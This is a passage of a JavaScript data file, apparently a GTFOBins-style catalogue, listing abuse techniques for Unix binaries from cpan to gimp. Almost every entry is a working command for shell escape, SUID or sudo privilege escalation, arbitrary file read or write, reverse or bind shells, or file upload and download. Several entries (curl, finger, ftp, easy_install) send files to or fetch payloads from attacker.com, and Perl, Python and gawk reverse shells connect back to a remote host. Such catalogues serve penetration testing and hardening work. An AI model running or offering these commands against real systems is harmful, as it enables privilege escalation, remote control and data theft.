            "reverse-shell": ["export RHOST=localhost\nexport RPORT=9000\ncpan\n! use Socket; my $i=\"$ENV{RHOST}\"; my $p=$ENV{RPORT}; socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\")); if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\"); open(STDOUT,\">&S\"); open(STDERR,\">&S\"); exec(\"/bin/sh -i\");};"],
            "file-upload": ["cpan\n! use HTTP::Server::Simple; my $server= HTTP::Server::Simple->new(); $server->run();"],
            "file-download": ["export URL=http://attacker.com/file_to_get\ncpan\n! use File::Fetch; my $file = (File::Fetch->new(uri => \"$ENV{URL}\"))->fetch();"],
            "sudo": ["sudo cpan\n! exec '/bin/bash'"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ cpio ============ */
    {
        name: "cpio",
        functions: {
            "shell": ["echo '/bin/sh </dev/tty >/dev/tty' >localhost\ncpio -o --rsh-command /bin/sh -F localhost:"],
            "file-write": ["LFILE=file_to_write\nLDIR=where_to_write\necho DATA >$LFILE\necho $LFILE | cpio -up $LDIR"],
            "file-read": ["LFILE=file_to_read\necho \"$LFILE\" | cpio -o"],
            "suid": ["sudo install -m =xs $(which cpio) .\n\nLFILE=file_to_read\nTF=$(mktemp -d)\necho \"$LFILE\" | ./cpio -R $UID -dp $TF\ncat \"$TF/$LFILE\""],
            "sudo": ["echo '/bin/sh </dev/tty >/dev/tty' >localhost\nsudo cpio -o --rsh-command /bin/sh -F localhost:"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ cpulimit ============ */
    {
        name: "cpulimit",
        functions: {
            "shell": ["cpulimit -l 100 -f /bin/sh"],
            "suid": ["sudo install -m =xs $(which cpulimit) .\n\n./cpulimit -l 100 -f -- /bin/sh -p"],
            "sudo": ["sudo cpulimit -l 100 -f /bin/sh"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ crash ============ */
    {
        name: "crash",
        functions: {
            "shell": ["crash -h\n!sh"],
            "command": ["COMMAND='/usr/bin/id'\nCRASHPAGER=\"$COMMAND\" crash -h"],
            "sudo": ["sudo crash -h\n!sh"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ crontab ============ */
    {
        name: "crontab",
        functions: {
            "command": ["crontab -e"],
            "sudo": ["sudo crontab -e"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ csh ============ */
    {
        name: "csh",
        functions: {
            "shell": ["csh"],
            "file-write": ["export LFILE=file_to_write\ncsh -c 'echo DATA > $LFILE'"],
            "suid": ["sudo install -m =xs $(which csh) .\n\n./csh -b"],
            "sudo": ["sudo csh"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ csplit ============ */
    {
        name: "csplit",
        functions: {
            "file-write": ["TF=$(mktemp)\necho \"DATA\" > $TF\nLFILE=file_to_write\ncsplit -z -b \"%d$LFILE\" $TF 1"],
            "file-read": ["LFILE=file_to_read\ncsplit $LFILE 1\ncat xx01"],
            "suid": ["sudo install -m =xs $(which csplit) .\n\nLFILE=file_to_read\ncsplit $LFILE 1\ncat xx01"],
            "sudo": ["LFILE=file_to_read\ncsplit $LFILE 1\ncat xx01"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ csvtool ============ */
    {
        name: "csvtool",
        functions: {
            "shell": ["csvtool call '/bin/sh;false' /etc/passwd"],
            "file-write": ["LFILE=file_to_write\nTF=$(mktemp)\necho DATA > $TF\ncsvtool trim t $TF -o $LFILE"],
            "file-read": ["LFILE=file_to_read\ncsvtool trim t $LFILE"],
            "suid": ["sudo install -m =xs $(which csvtool) .\n\nLFILE=file_to_read\n./csvtool trim t $LFILE"],
            "sudo": ["sudo csvtool call '/bin/sh;false' /etc/passwd"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ cupsfilter ============ */
    {
        name: "cupsfilter",
        functions: {
            "file-read": ["LFILE=file_to_read\ncupsfilter -i application/octet-stream -m application/octet-stream $LFILE"],
            "suid": ["sudo install -m =xs $(which cupsfilter) .\n\nLFILE=file_to_read\n./cupsfilter -i application/octet-stream -m application/octet-stream $LFILE"],
            "sudo": ["LFILE=file_to_read\nsudo cupsfilter -i application/octet-stream -m application/octet-stream $LFILE"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ curl ============ */
    {
        name: "curl",
        functions: {
            "file-upload": ["URL=http://attacker.com/\nLFILE=file_to_send\ncurl -X POST -d \"@$LFILE\" $URL"],
            "file-download": ["URL=http://attacker.com/file_to_get\nLFILE=file_to_save\ncurl $URL -o $LFILE"],
            "file-write": ["LFILE=file_to_write\nTF=$(mktemp)\necho DATA >$TF\ncurl \"file://$TF\" -o \"$LFILE\""],
            "file-read": ["LFILE=/tmp/file_to_read\ncurl file://$LFILE"],
            "suid": ["sudo install -m =xs $(which curl) .\n\nURL=http://attacker.com/file_to_get\nLFILE=file_to_save\n./curl $URL -o $LFILE"],
            "sudo": ["URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nsudo curl $URL -o $LFILE"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ cut ============ */
    {
        name: "cut",
        functions: {
            "file-read": ["LFILE=file_to_read\ncut -d \"\" -f1 \"$LFILE\""],
            "suid": ["sudo install -m =xs $(which cut) .\n\nLFILE=file_to_read\n./cut -d \"\" -f1 \"$LFILE\""],
            "sudo": ["LFILE=file_to_read\nsudo cut -d \"\" -f1 \"$LFILE\""]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ dash ============ */
    {
        name: "dash",
        functions: {
            "shell": ["dash"],
            "file-write": ["export LFILE=file_to_write\ndash -c 'echo DATA > $LFILE'"],
            "suid": ["sudo install -m =xs $(which dash) .\n\n./dash -p"],
            "sudo": ["sudo dash"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ date ============ */
    {
        name: "date",
        functions: {
            "file-read": ["LFILE=file_to_read\ndate -f $LFILE"],
            "suid": ["sudo install -m =xs $(which date) .\n\nLFILE=file_to_read\n./date -f $LFILE"],
            "sudo": ["LFILE=file_to_read\nsudo date -f $LFILE"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ dc ============ */
    {
        name: "dc",
        functions: {
            "shell": ["dc -e '!/bin/sh'"],
            "sudo": ["sudo dc -e '!/bin/sh'"],
            "limited-suid": ["sudo install -m =xs $(which dc) .\n\n./dc -e '!/bin/sh'"]
        },
        contexts: ["unprivileged", "sudo", "limited-suid"]
    },

    /* ============ dd ============ */
    {
        name: "dd",
        functions: {
            "file-write": ["LFILE=file_to_write\necho \"DATA\" | dd of=$LFILE"],
            "file-read": ["LFILE=file_to_read\ndd if=$LFILE"],
            "suid": ["sudo install -m =xs $(which dd) .\n\nLFILE=file_to_write\necho \"data\" | ./dd of=$LFILE"],
            "sudo": ["LFILE=file_to_write\necho \"data\" | sudo dd of=$LFILE"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ debugfs ============ */
    {
        name: "debugfs",
        functions: {
            "shell": ["debugfs\n!/bin/sh"],
            "suid": ["sudo install -m =xs $(which debugfs) .\n\n./debugfs\n!/bin/sh"],
            "sudo": ["sudo debugfs\n!/bin/sh"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ dialog ============ */
    {
        name: "dialog",
        functions: {
            "file-read": ["LFILE=file_to_read\ndialog --textbox \"$LFILE\" 0 0"],
            "suid": ["sudo install -m =xs $(which dialog) .\n\nLFILE=file_to_read\n./dialog --textbox \"$LFILE\" 0 0"],
            "sudo": ["LFILE=file_to_read\nsudo dialog --textbox \"$LFILE\" 0 0"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ diff ============ */
    {
        name: "diff",
        functions: {
            "file-read": ["LFILE=file_to_read\ndiff --line-format=%L /dev/null $LFILE"],
            "suid": ["sudo install -m =xs $(which diff) .\n\nLFILE=file_to_read\n./diff --line-format=%L /dev/null $LFILE"],
            "sudo": ["LFILE=file_to_read\nsudo diff --line-format=%L /dev/null $LFILE"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ dig ============ */
    {
        name: "dig",
        functions: {
            "file-read": ["LFILE=file_to_read\ndig -f $LFILE"],
            "suid": ["sudo install -m =xs $(which dig) .\n\nLFILE=file_to_read\n./dig -f $LFILE"],
            "sudo": ["LFILE=file_to_read\nsudo dig -f $LFILE"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ distcc ============ */
    {
        name: "distcc",
        functions: {
            "shell": ["distcc /bin/sh"],
            "suid": ["sudo install -m =xs $(which distcc) .\n\n./distcc /bin/sh -p"],
            "sudo": ["sudo distcc /bin/sh"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ dmesg ============ */
    {
        name: "dmesg",
        functions: {
            "shell": ["dmesg -H\n!/bin/sh"],
            "file-read": ["LFILE=file_to_read\ndmesg -rF \"$LFILE\""],
            "sudo": ["sudo dmesg -H\n!/bin/sh"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ dmidecode ============ */
    {
        name: "dmidecode",
        functions: {
            "sudo": ["make dmiwrite\nTF=$(mktemp)\necho \"DATA\" > $TF\n./dmiwrite $TF x.dmi\nLFILE=file_to_write\nsudo dmidecode --no-sysfs -d x.dmi --dump-bin \"$LFILE\""]
        },
        contexts: ["sudo"]
    },

    /* ============ dmsetup ============ */
    {
        name: "dmsetup",
        functions: {
            "suid": ["sudo install -m =xs $(which dmsetup) .\n\n./dmsetup ls --exec '/bin/sh -p -s'"],
            "sudo": ["sudo dmsetup ls --exec '/bin/sh -s'"]
        },
        contexts: ["suid", "sudo"]
    },

    /* ============ dnf ============ */
    {
        name: "dnf",
        functions: {
            "sudo": ["TF=$(mktemp -d)\necho 'id' > $TF/x.sh\nfpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF\nsudo dnf install -y x-1.0-1.noarch.rpm"]
        },
        contexts: ["sudo"]
    },

    /* ============ docker ============ */
    {
        name: "docker",
        functions: {
            "shell": ["docker run -v /:/mnt --rm -it alpine chroot /mnt sh"],
            "file-write": ["CONTAINER_ID=\"$(docker run -d alpine)\"\nTF=$(mktemp)\necho \"DATA\" > $TF\ndocker cp $TF $CONTAINER_ID:$TF\ndocker cp $CONTAINER_ID:$TF file_to_write"],
            "file-read": ["CONTAINER_ID=\"$(docker run -d alpine)\"\nTF=$(mktemp)\ndocker cp file_to_read $CONTAINER_ID:$TF\ndocker cp $CONTAINER_ID:$TF $TF\ncat $TF"],
            "suid": ["sudo install -m =xs $(which docker) .\n\n./docker run -v /:/mnt --rm -it alpine chroot /mnt sh"],
            "sudo": ["sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ dos2unix ============ */
    {
        name: "dos2unix",
        functions: {
            "file-write": ["LFILE1=file_to_read\nLFILE2=file_to_write\ndos2unix -f -n \"$LFILE1\" \"$LFILE2\""]
        },
        contexts: ["unprivileged"]
    },

    /* ============ dosbox ============ */
    {
        name: "dosbox",
        functions: {
            "file-write": ["LFILE='\\path\\to\\file_to_write'\ndosbox -c 'mount c /' -c \"echo DATA >c:$LFILE\" -c exit"],
            "file-read": ["LFILE='\\path\\to\\file_to_read'\ndosbox -c 'mount c /' -c \"type c:$LFILE\""],
            "suid": ["sudo install -m =xs $(which dosbox) .\n\nLFILE='\\path\\to\\file_to_write'\n./dosbox -c 'mount c /' -c \"echo DATA >c:$LFILE\" -c exit"],
            "sudo": ["LFILE='\\path\\to\\file_to_write'\nsudo dosbox -c 'mount c /' -c \"echo DATA >c:$LFILE\" -c exit"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ dotnet ============ */
    {
        name: "dotnet",
        functions: {
            "shell": ["dotnet fsi\nSystem.Diagnostics.Process.Start(\"/bin/sh\").WaitForExit();;"],
            "file-read": ["export LFILE=file_to_read\ndotnet fsi\nSystem.IO.File.ReadAllText(System.Environment.GetEnvironmentVariable(\"LFILE\"));;"],
            "sudo": ["sudo dotnet fsi\nSystem.Diagnostics.Process.Start(\"/bin/sh\").WaitForExit();;"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ dpkg ============ */
    {
        name: "dpkg",
        functions: {
            "shell": ["dpkg -l\n!/bin/sh"],
            "sudo": ["sudo dpkg -l\n!/bin/sh\n\nTF=$(mktemp -d)\necho 'exec /bin/sh' > $TF/x.sh\nfpm -n x -s dir -t deb -a all --before-install $TF/x.sh $TF\nsudo dpkg -i x_1.0_all.deb"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ dstat ============ */
    {
        name: "dstat",
        functions: {
            "shell": ["mkdir -p ~/.dstat\necho 'import os; os.execv(\"/bin/sh\", [\"sh\"])' >~/.dstat/dstat_xxx.py\ndstat --xxx"],
            "sudo": ["echo 'import os; os.execv(\"/bin/sh\", [\"sh\"])' >/usr/local/share/dstat/dstat_xxx.py\nsudo dstat --xxx"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ dvips ============ */
    {
        name: "dvips",
        functions: {
            "shell": ["tex '\\special{psfile=\"`/bin/sh 1>&0\"}\\end'\ndvips -R0 texput.dvi"],
            "sudo": ["tex '\\special{psfile=\"`/bin/sh 1>&0\"}\\end'\nsudo dvips -R0 texput.dvi"],
            "limited-suid": ["sudo install -m =xs $(which dvips) .\n\ntex '\\special{psfile=\"`/bin/sh 1>&0\"}\\end'\n./dvips -R0 texput.dvi"]
        },
        contexts: ["unprivileged", "sudo", "limited-suid"]
    },

    /* ============ easy_install ============ */
    {
        name: "easy_install",
        functions: {
            "shell": ["TF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\neasy_install $TF"],
            "reverse-shell": ["export RHOST=attacker.com\nexport RPORT=12345\nTF=$(mktemp -d)\necho 'import sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")' > $TF/setup.py\neasy_install $TF"],
            "file-upload": ["export URL=http://attacker.com/\nexport LFILE=file_to_send\nTF=$(mktemp -d)\necho 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))' > $TF/setup.py\neasy_install $TF"],
            "file-download": ["export URL=http://attacker.com/file_to_get\nexport LFILE=/tmp/file_to_save\nTF=$(mktemp -d)\necho \"import os;\nos.execl('$(whereis python)', '$(whereis python)', '-c', \\\"\\\"\\\"import sys;\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve('$URL', '$LFILE')\\\"\\\"\\\")\" > $TF/setup.py\npip install $TF"],
            "file-write": ["export LFILE=/tmp/file_to_save\nTF=$(mktemp -d)\necho \"import os;\nos.execl('$(whereis python)', 'python', '-c', 'open(\\\"$LFILE\\\",\\\"w+\\\").write(\\\"DATA\\\")')\" > $TF/setup.py\neasy_install $TF"],
            "file-read": ["TF=$(mktemp -d)\necho 'print(open(\"file_to_read\").read())' > $TF/setup.py\neasy_install $TF"],
            "library-load": ["TF=$(mktemp -d)\necho 'from ctypes import cdll; cdll.LoadLibrary(\"lib.so\")' > $TF/setup.py\neasy_install $TF"],
            "sudo": ["TF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\nsudo easy_install $TF"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ eb ============ */
    {
        name: "eb",
        functions: {
            "shell": ["eb logs\n!/bin/sh"],
            "sudo": ["sudo eb logs\n!/bin/sh"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ ed ============ */
    {
        name: "ed",
        functions: {
            "shell": ["ed\n!/bin/sh"],
            "file-write": ["ed file_to_write\na\nDATA\n.\nw\nq"],
            "file-read": ["ed file_to_read\n,p\nq"],
            "suid": ["sudo install -m =xs $(which ed) .\n\n./ed file_to_read\n,p\nq"],
            "sudo": ["sudo ed\n!/bin/sh"],
            "limited-suid": ["sudo install -m =xs $(which ed) .\n\n./ed\n!/bin/sh"]
        },
        contexts: ["unprivileged", "suid", "sudo", "limited-suid"]
    },

    /* ============ efax ============ */
    {
        name: "efax",
        functions: {
            "suid": ["sudo install -m =xs $(which efax) .\n\nLFILE=file_to_read\n./efax -d \"$LFILE\""],
            "sudo": ["LFILE=file_to_read\nsudo efax -d \"$LFILE\""]
        },
        contexts: ["suid", "sudo"]
    },

    /* ============ elvish ============ */
    {
        name: "elvish",
        functions: {
            "shell": ["elvish"],
            "file-write": ["export LFILE=file_to_write\nelvish -c 'echo DATA >$E:LFILE'"],
            "file-read": ["export LFILE=file_to_read\nelvish -c 'echo (slurp <$E:LFILE)'"],
            "suid": ["sudo install -m =xs $(which elvish) .\n\n./elvish"],
            "sudo": ["sudo elvish"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ emacs ============ */
    {
        name: "emacs",
        functions: {
            "shell": ["emacs -Q -nw --eval '(term \"/bin/sh\")'"],
            "file-write": ["emacs file_to_write\nDATA\nC-x C-s"],
            "file-read": ["emacs file_to_read"],
            "suid": ["sudo install -m =xs $(which emacs) .\n\n./emacs -Q -nw --eval '(term \"/bin/sh -p\")'"],
            "sudo": ["sudo emacs -Q -nw --eval '(term \"/bin/sh\")'"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ enscript ============ */
    {
        name: "enscript",
        functions: {
            "shell": ["enscript /dev/null -qo /dev/null -I '/bin/sh >&2'"],
            "sudo": ["sudo enscript /dev/null -qo /dev/null -I '/bin/sh >&2'"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ env ============ */
    {
        name: "env",
        functions: {
            "shell": ["env /bin/sh"],
            "suid": ["sudo install -m =xs $(which env) .\n\n./env /bin/sh -p"],
            "sudo": ["sudo env /bin/sh"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ eqn ============ */
    {
        name: "eqn",
        functions: {
            "file-read": ["LFILE=file_to_read\neqn \"$LFILE\""],
            "suid": ["sudo install -m =xs $(which eqn) .\n\nLFILE=file_to_read\n./eqn \"$LFILE\""],
            "sudo": ["LFILE=file_to_read\nsudo eqn \"$LFILE\""]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ espeak ============ */
    {
        name: "espeak",
        functions: {
            "file-read": ["LFILE=file_to_read\nespeak -qXf \"$LFILE\""],
            "suid": ["sudo install -m =xs $(which espeak) .\n\nLFILE=file_to_read\n./espeak -qXf \"$LFILE\""],
            "sudo": ["LFILE=file_to_read\nsudo espeak -qXf \"$LFILE\""]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ ex ============ */
    {
        name: "ex",
        functions: {
            "shell": ["ex\n!/bin/sh"],
            "file-write": ["ex file_to_write\na\nDATA\n.\nw\nq"],
            "file-read": ["ex file_to_read\n,p\nq"],
            "sudo": ["sudo ex\n!/bin/sh"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ exiftool ============ */
    {
        name: "exiftool",
        functions: {
            "file-write": ["LFILE=file_to_write\nINPUT=input_file\nexiftool -filename=$LFILE $INPUT"],
            "file-read": ["LFILE=file_to_read\nOUTPUT=output_file\nexiftool -filename=$OUTPUT $LFILE\ncat $OUTPUT"],
            "sudo": ["LFILE=file_to_write\nINPUT=input_file\nsudo exiftool -filename=$LFILE $INPUT"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ expand ============ */
    {
        name: "expand",
        functions: {
            "file-read": ["LFILE=file_to_read\nexpand \"$LFILE\""],
            "suid": ["sudo install -m =xs $(which expand) .\n\nLFILE=file_to_read\n./expand \"$LFILE\""],
            "sudo": ["LFILE=file_to_read\nsudo expand \"$LFILE\""]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ expect ============ */
    {
        name: "expect",
        functions: {
            "shell": ["expect -c 'spawn /bin/sh;interact'"],
            "file-read": ["LFILE=file_to_read\nexpect $LFILE"],
            "suid": ["sudo install -m =xs $(which expect) .\n\n./expect -c 'spawn /bin/sh -p;interact'"],
            "sudo": ["sudo expect -c 'spawn /bin/sh;interact'"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ facter ============ */
    {
        name: "facter",
        functions: {
            "shell": ["TF=$(mktemp -d)\necho 'exec(\"/bin/sh\")' > $TF/x.rb\nFACTERLIB=$TF facter"],
            "sudo": ["TF=$(mktemp -d)\necho 'exec(\"/bin/sh\")' > $TF/x.rb\nsudo FACTERLIB=$TF facter"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ file ============ */
    {
        name: "file",
        functions: {
            "file-read": ["LFILE=file_to_read\nfile -f $LFILE\n\nLFILE=file_to_read\nfile -m $LFILE"],
            "suid": ["sudo install -m =xs $(which file) .\n\nLFILE=file_to_read\n./file -f $LFILE"],
            "sudo": ["LFILE=file_to_read\nsudo file -f $LFILE"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ find ============ */
    {
        name: "find",
        functions: {
            "shell": ["find . -exec /bin/sh \\; -quit"],
            "file-write": ["LFILE=file_to_write\nfind / -fprintf \"$LFILE\" DATA -quit"],
            "suid": ["sudo install -m =xs $(which find) .\n\n./find . -exec /bin/sh -p \\; -quit"],
            "sudo": ["sudo find . -exec /bin/sh \\; -quit"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ finger ============ */
    {
        name: "finger",
        functions: {
            "file-upload": ["RHOST=attacker.com\nLFILE=file_to_send\nfinger \"$(base64 $LFILE)@$RHOST\""],
            "file-download": ["RHOST=attacker.com\nLFILE=file_to_save\nfinger x@$RHOST | base64 -d > \"$LFILE\""]
        },
        contexts: ["unprivileged"]
    },

    /* ============ fish ============ */
    {
        name: "fish",
        functions: {
            "shell": ["fish"],
            "suid": ["sudo install -m =xs $(which fish) .\n\n./fish"],
            "sudo": ["sudo fish"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ flock ============ */
    {
        name: "flock",
        functions: {
            "shell": ["flock -u / /bin/sh"],
            "suid": ["sudo install -m =xs $(which flock) .\n\n./flock -u / /bin/sh -p"],
            "sudo": ["sudo flock -u / /bin/sh"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ fmt ============ */
    {
        name: "fmt",
        functions: {
            "file-read": ["LFILE=file_to_read\nfmt -999 \"$LFILE\""],
            "suid": ["sudo install -m =xs $(which fmt) .\n\nLFILE=file_to_read\n./fmt -999 \"$LFILE\""],
            "sudo": ["LFILE=file_to_read\nsudo fmt -999 \"$LFILE\""]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ fold ============ */
    {
        name: "fold",
        functions: {
            "file-read": ["LFILE=file_to_read\nfold -w99999999 \"$LFILE\""],
            "suid": ["sudo install -m =xs $(which fold) .\n\nLFILE=file_to_read\n./fold -w99999999 \"$LFILE\""],
            "sudo": ["LFILE=file_to_read\nsudo fold -w99999999 \"$LFILE\""]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ fping ============ */
    {
        name: "fping",
        functions: {
            "file-read": ["LFILE=file_to_read\nfping -f $LFILE"],
            "sudo": ["LFILE=file_to_read\nsudo fping -f $LFILE"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ ftp ============ */
    {
        name: "ftp",
        functions: {
            "shell": ["ftp\n!/bin/sh"],
            "file-upload": ["RHOST=attacker.com\nftp $RHOST\nput file_to_send"],
            "file-download": ["RHOST=attacker.com\nftp $RHOST\nget file_to_get"],
            "sudo": ["sudo ftp\n!/bin/sh"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ gawk ============ */
    {
        name: "gawk",
        functions: {
            "shell": ["gawk 'BEGIN {system(\"/bin/sh\")}'"],
            "reverse-shell": ["RHOST=attacker.com\nRPORT=12345\ngawk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN { s = \"/inet/tcp/0/\" RHOST \"/\" RPORT; while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break; while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'"],
            "bind-shell": ["LPORT=12345\ngawk -v LPORT=$LPORT 'BEGIN { s = \"/inet/tcp/\" LPORT \"/0/0\"; while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break; while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'"],
            "file-write": ["LFILE=file_to_write\ngawk -v LFILE=$LFILE 'BEGIN { print \"DATA\" > LFILE }'"],
            "file-read": ["LFILE=file_to_read\ngawk '//' \"$LFILE\""],
            "suid": ["sudo install -m =xs $(which gawk) .\n\nLFILE=file_to_read\n./gawk '//' \"$LFILE\""],
            "sudo": ["sudo gawk 'BEGIN {system(\"/bin/sh\")}'"],
            "limited-suid": ["sudo install -m =xs $(which gawk) .\n\n./gawk 'BEGIN {system(\"/bin/sh\")}'"]
        },
        contexts: ["unprivileged", "suid", "sudo", "limited-suid"]
    },

    /* ============ gcc ============ */
    {
        name: "gcc",
        functions: {
            "shell": ["gcc -wrapper /bin/sh,-s ."],
            "file-write": ["LFILE=file_to_delete\ngcc -xc /dev/null -o $LFILE"],
            "file-read": ["LFILE=file_to_read\ngcc -x c -E \"$LFILE\"\n\nLFILE=file_to_read\ngcc @\"$LFILE\""],
            "sudo": ["sudo gcc -wrapper /bin/sh,-s ."]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ gcloud ============ */
    {
        name: "gcloud",
        functions: {
            "shell": ["gcloud help\n!/bin/sh"],
            "sudo": ["sudo gcloud help\n!/bin/sh"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ gcore ============ */
    {
        name: "gcore",
        functions: {
            "file-read": ["gcore $PID"],
            "suid": ["sudo install -m =xs $(which gcore) .\n\n./gcore $PID"],
            "sudo": ["sudo gcore $PID"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ gdb ============ */
    {
        name: "gdb",
        functions: {
            "shell": ["gdb -nx -ex '!sh' -ex quit"],
            "reverse-shell": ["export RHOST=attacker.com\nexport RPORT=12345\ngdb -nx -ex 'python import sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")' -ex quit"],
            "file-write": ["LFILE=file_to_write\ngdb -nx -ex \"dump value $LFILE \\\"DATA\\\"\" -ex quit"],
            "file-read": ["gdb -nx -ex 'python print(open(\"file_to_read\").read())' -ex quit"],
            "library-load": ["gdb -nx -ex 'python from ctypes import cdll; cdll.LoadLibrary(\"lib.so\")' -ex quit"],
            "suid": ["sudo install -m =xs $(which gdb) .\n\n./gdb -nx -ex 'python import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")' -ex quit"],
            "sudo": ["sudo gdb -nx -ex '!sh' -ex quit"],
            "capabilities": ["cp $(which gdb) .\nsudo setcap cap_setuid+ep gdb\n\n./gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit"]
        },
        contexts: ["unprivileged", "suid", "sudo", "capabilities"]
    },

    /* ============ gem ============ */
    {
        name: "gem",
        functions: {
            "shell": ["gem open -e \"/bin/sh -c /bin/sh\" rdoc"],
            "sudo": ["sudo gem open -e \"/bin/sh -c /bin/sh\" rdoc"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ genie ============ */
    {
        name: "genie",
        functions: {
            "shell": ["genie -c '/bin/sh'"],
            "suid": ["sudo install -m =xs $(which genie) .\n\n./genie -c '/bin/sh'"],
            "sudo": ["sudo genie -c '/bin/sh'"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ genisoimage ============ */
    {
        name: "genisoimage",
        functions: {
            "file-read": ["LFILE=file_to_read\ngenisoimage -q -o - \"$LFILE\""],
            "suid": ["sudo install -m =xs $(which genisoimage) .\n\nLFILE=file_to_read\n./genisoimage -sort \"$LFILE\""],
            "sudo": ["LFILE=file_to_read\nsudo genisoimage -q -o - \"$LFILE\""]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ ghc ============ */
    {
        name: "ghc",
        functions: {
            "shell": ["ghc -e 'System.Process.callCommand \"/bin/sh\"'"],
            "sudo": ["sudo ghc -e 'System.Process.callCommand \"/bin/sh\"'"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ ghci ============ */
    {
        name: "ghci",
        functions: {
            "shell": ["ghci\nSystem.Process.callCommand \"/bin/sh\""],
            "sudo": ["sudo ghci\nSystem.Process.callCommand \"/bin/sh\""]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ gimp ============ */
    {
        name: "gimp",
        functions: {
            "shell": ["gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(\"sh\")'"],
            "reverse-shell": ["export RHOST=attacker.com\nexport RPORT=12345\ngimp -idf --batch-interpreter=python-fu-eval -b 'import sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")'"],
